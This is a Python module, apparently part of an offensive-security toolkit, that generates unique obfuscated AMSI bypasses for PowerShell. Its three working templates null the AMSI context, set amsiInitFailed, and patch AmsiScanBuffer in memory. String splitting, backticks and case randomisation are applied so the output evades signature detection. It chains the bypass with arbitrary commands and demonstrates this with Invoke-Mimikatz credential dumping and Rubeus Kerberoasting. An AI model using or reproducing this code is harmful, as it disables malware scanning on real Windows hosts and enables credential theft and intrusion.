"""Generates obfuscated AMSI bypasses and PowerShell commands.

Applies variable-name randomisation, string splitting, backtick insertion,
case randomisation, and base64 / character-code encoding so each generation
produces a unique payload.

References:
- https://github.com/Flangvik/AMSI.fail
- https://github.com/danielbohannon/Invoke-Obfuscation
- https://amsi.fail
"""

import random
import string
import base64
from typing import List, Optional
from enum import Enum


class ObfuscationLevel(Enum):
    """Obfuscation intensity levels"""
    LIGHT = "light"      # Variable randomization only
    MEDIUM = "medium"    # + string splitting + backticks
    HEAVY = "heavy"      # + base64 + char codes


class ObfuscationService:
    """
    Service for generating obfuscated PowerShell code.
    Each call generates unique output to evade signature detection.
    """

    def __init__(self):
        # Characters for random variable names
        self.var_chars = string.ascii_letters
        # PowerShell reserved words to avoid
        self.reserved_words = {
            'if', 'else', 'for', 'foreach', 'while', 'do', 'switch',
            'function', 'param', 'return', 'break', 'continue', 'throw',
            'try', 'catch', 'finally', 'in', 'process', 'begin', 'end'
        }

        # AMSI bypass templates (base versions to obfuscate)
        self.amsi_templates = [
            self._template_reflection_context,
            self._template_scan_buffer_patch,
            self._template_field_modification,
        ]

    # =========================================================================
    # PUBLIC API
    # =========================================================================

    def generate_amsi_bypass(self, level: ObfuscationLevel = ObfuscationLevel.MEDIUM) -> str:
        """
        Generate a fresh obfuscated AMSI bypass.
        Each call produces unique output.

        Args:
            level: Obfuscation intensity

        Returns:
            Obfuscated PowerShell AMSI bypass code
        """
        # Randomly select a bypass template
        template_func = random.choice(self.amsi_templates)
        base_code = template_func()

        # Apply obfuscation based on level
        if level == ObfuscationLevel.LIGHT:
            return self._apply_variable_randomization(base_code)
        elif level == ObfuscationLevel.MEDIUM:
            code = self._apply_variable_randomization(base_code)
            code = self._apply_string_splitting(code)
            code = self._apply_backticks(code)
            return code
        else:  # HEAVY
            code = self._apply_variable_randomization(base_code)
            code = self._apply_string_splitting(code)
            code = self._apply_backticks(code)
            code = self._apply_case_randomization(code)
            return code

    def obfuscate_command(self, command: str, level: ObfuscationLevel = ObfuscationLevel.MEDIUM) -> str:
        """
        Obfuscate any PowerShell command.

        Args:
            command: PowerShell command to obfuscate
            level: Obfuscation intensity

        Returns:
            Obfuscated command
        """
        if level == ObfuscationLevel.LIGHT:
            return self._apply_backticks(command)
        elif level == ObfuscationLevel.MEDIUM:
            code = self._apply_string_splitting(command)
            code = self._apply_backticks(code)
            return code
        else:  # HEAVY
            code = self._apply_string_splitting(command)
            code = self._apply_backticks(code)
            code = self._apply_case_randomization(code)
            return code

    def generate_bypass_with_command(
        self,
        command: str,
        level: ObfuscationLevel = ObfuscationLevel.MEDIUM
    ) -> str:
        """
        Generate AMSI bypass followed by obfuscated command.

        Args:
            command: PowerShell command to run after bypass
            level: Obfuscation intensity

        Returns:
            Complete obfuscated script (bypass + command)
        """
        bypass = self.generate_amsi_bypass(level)
        obf_command = self.obfuscate_command(command, level)

        return f"{bypass}\n\n# Execute command\n{obf_command}"

    def get_encoded_command(self, command: str) -> str:
        """
        Generate base64 encoded PowerShell command for -EncodedCommand.

        Args:
            command: PowerShell command

        Returns:
            powershell -EncodedCommand <base64>
        """
        # PowerShell expects UTF-16LE encoding
        encoded = base64.b64encode(command.encode('utf-16le')).decode('ascii')
        return f"powershell -EncodedCommand {encoded}"

    # =========================================================================
    # AMSI BYPASS TEMPLATES
    # =========================================================================

    def _template_reflection_context(self) -> str:
        """
        AMSI bypass via reflection - sets amsiContext to null.
        This is the classic Matt Graeber technique.
        """
        v1 = self._random_var()
        v2 = self._random_var()
        v3 = self._random_var()
        v4 = self._random_var()
        v5 = self._random_var()

        return f"""${v1}=[Ref].Assembly.GetTypes()
ForEach(${v2} in ${v1}){{if(${v2}.Name -like "*siUt*"){{${v3}=${v2}}}}}
${v4}=${v3}.GetFields("NonPublic,Static")
ForEach(${v5} in ${v4}){{if(${v5}.Name -like "*Context"){{${v5}.SetValue($null,[IntPtr]::Zero)}}}}"""

    def _template_scan_buffer_patch(self) -> str:
        """
        AMSI bypass via AmsiScanBuffer patch.
        Patches the function to return clean result.
        """
        v_win32 = self._random_var()
        v_ptr = self._random_var()
        v_old = self._random_var()
        class_name = self._random_var(8)  # Reuse same class name

        return f"""${v_win32}=@"
using System;using System.Runtime.InteropServices;
public class {class_name}{{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}}
"@
Add-Type ${v_win32}
${v_ptr}=[{class_name}]::GetProcAddress([{class_name}]::LoadLibrary("amsi.dll"),"AmsiScanBuffer")
${v_old}=0
[{class_name}]::VirtualProtect(${v_ptr},[uint32]5,0x40,[ref]${v_old})
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0xB8)
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0x57,1)
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0x00,2)
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0x07,3)
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0x80,4)
[System.Runtime.InteropServices.Marshal]::WriteByte(${v_ptr},0xC3,5)"""

    def _template_field_modification(self) -> str:
        """
        AMSI bypass via amsiInitFailed field modification.
        Sets the failed flag to skip scanning.
        """
        v1 = self._random_var()
        v2 = self._random_var()
        v3 = self._random_var()

        return f"""${v1}=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
${v2}=${v1}.GetField("amsiInitFailed","NonPublic,Static")
${v2}.SetValue($null,$true)"""

    # =========================================================================
    # OBFUSCATION TECHNIQUES
    # =========================================================================

    def _random_var(self, length: int = 4) -> str:
        """Generate random variable name"""
        while True:
            name = ''.join(random.choices(self.var_chars, k=length))
            if name.lower() not in self.reserved_words:
                return name

    def _apply_variable_randomization(self, code: str) -> str:
        """Replace placeholder variables with random names"""
        # This is handled in templates - they already use _random_var()
        return code

    def _apply_string_splitting(self, code: str) -> str:
        """
        Split suspicious strings into concatenations.
        "AmsiUtils" -> "Amsi"+"Utils"
        """
        suspicious_strings = [
            ("AmsiUtils", "Amsi", "Utils"),
            ("amsiContext", "amsi", "Context"),
            ("AmsiScanBuffer", "Amsi", "Scan", "Buffer"),
            ("amsiInitFailed", "amsi", "Init", "Failed"),
            ("Invoke-Mimikatz", "Invoke-", "Mimi", "katz"),
            ("Invoke-Expression", "Invoke-", "Exp", "ression"),
            ("IEX", "I", "E", "X"),
            ("DownloadString", "Download", "String"),
            ("Net.WebClient", "Net.", "Web", "Client"),
            ("Rubeus", "Ru", "be", "us"),
            ("mimikatz", "mimi", "katz"),
            ("sekurlsa", "sekur", "lsa"),
            ("kerberos", "kerbe", "ros"),
        ]

        result = code
        for item in suspicious_strings:
            original = item[0]
            if original in result:
                # Create concatenation
                parts = item[1:]
                replacement = '("' + '"+\"'.join(parts) + '")'
                # Only replace some occurrences randomly
                if random.random() > 0.3:
                    result = result.replace(original, replacement, 1)

        return result

    def _apply_backticks(self, code: str) -> str:
        """
        Insert backticks into keywords to break signatures.
        GetTypes -> Ge`tTy`pes
        """
        # Keywords that benefit from backtick insertion
        keywords = [
            "GetTypes", "GetType", "GetFields", "GetField", "GetMethods",
            "GetMethod", "SetValue", "GetValue", "Assembly", "Invoke",
            "CreateInstance", "NonPublic", "Static", "LoadLibrary",
            "GetProcAddress", "VirtualProtect", "Marshal", "WriteByte"
        ]

        result = code
        for keyword in keywords:
            if keyword in result and random.random() > 0.4:
                # Insert backtick at random position (not first or last)
                if len(keyword) > 3:
                    pos = random.randint(2, len(keyword) - 2)
                    backticked = keyword[:pos] + '`' + keyword[pos:]
                    result = result.replace(keyword, backticked, 1)

        return result

    def _apply_case_randomization(self, code: str) -> str:
        """
        Randomize case of PowerShell keywords (PS is case-insensitive).
        ForEach -> fOrEaCh
        """
        # Only randomize certain keywords, not variable names
        keywords = [
            "ForEach", "Where", "Select", "if", "else", "function",
            "param", "return", "Add-Type", "New-Object", "Invoke"
        ]

        result = code
        for keyword in keywords:
            if keyword in result and random.random() > 0.5:
                randomized = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in keyword
                )
                result = result.replace(keyword, randomized, 1)

        return result

    def _string_to_char_codes(self, s: str) -> str:
        """
        Convert string to PowerShell char code concatenation.
        "test" -> [char]116+[char]101+[char]115+[char]116
        """
        chars = [f"[char]{ord(c)}" for c in s]
        return "(" + "+".join(chars) + ")"


# =========================================================================
# CONVENIENCE FUNCTIONS
# =========================================================================

# Singleton instance
_obfuscation_service: Optional[ObfuscationService] = None

def get_obfuscation_service() -> ObfuscationService:
    """Get or create the obfuscation service singleton"""
    global _obfuscation_service
    if _obfuscation_service is None:
        _obfuscation_service = ObfuscationService()
    return _obfuscation_service


def generate_amsi_bypass(level: str = "medium") -> str:
    """
    Convenience function to generate an AMSI bypass.

    Args:
        level: "light", "medium", or "heavy"

    Returns:
        Obfuscated AMSI bypass code
    """
    service = get_obfuscation_service()
    obf_level = ObfuscationLevel(level)
    return service.generate_amsi_bypass(obf_level)


def obfuscate_powershell(command: str, level: str = "medium") -> str:
    """
    Convenience function to obfuscate a PowerShell command.

    Args:
        command: PowerShell command
        level: "light", "medium", or "heavy"

    Returns:
        Obfuscated command
    """
    service = get_obfuscation_service()
    obf_level = ObfuscationLevel(level)
    return service.obfuscate_command(command, obf_level)


def generate_bypass_and_command(command: str, level: str = "medium") -> str:
    """
    Generate AMSI bypass + obfuscated command together.

    Args:
        command: PowerShell command to execute
        level: "light", "medium", or "heavy"

    Returns:
        Complete script with bypass and command
    """
    service = get_obfuscation_service()
    obf_level = ObfuscationLevel(level)
    return service.generate_bypass_with_command(command, obf_level)


# =========================================================================
# TESTING
# =========================================================================

if __name__ == "__main__":
    # Test the service
    service = ObfuscationService()

    print("=" * 60)
    print("AMSI BYPASS - LIGHT OBFUSCATION")
    print("=" * 60)
    print(service.generate_amsi_bypass(ObfuscationLevel.LIGHT))

    print("\n" + "=" * 60)
    print("AMSI BYPASS - MEDIUM OBFUSCATION")
    print("=" * 60)
    print(service.generate_amsi_bypass(ObfuscationLevel.MEDIUM))

    print("\n" + "=" * 60)
    print("AMSI BYPASS - HEAVY OBFUSCATION")
    print("=" * 60)
    print(service.generate_amsi_bypass(ObfuscationLevel.HEAVY))

    print("\n" + "=" * 60)
    print("OBFUSCATED COMMAND EXAMPLE")
    print("=" * 60)
    cmd = "Invoke-Mimikatz -DumpCreds"
    print(f"Original: {cmd}")
    print(f"Obfuscated: {service.obfuscate_command(cmd, ObfuscationLevel.MEDIUM)}")

    print("\n" + "=" * 60)
    print("BYPASS + COMMAND")
    print("=" * 60)
    print(service.generate_bypass_with_command("Rubeus.exe kerberoast", ObfuscationLevel.MEDIUM))
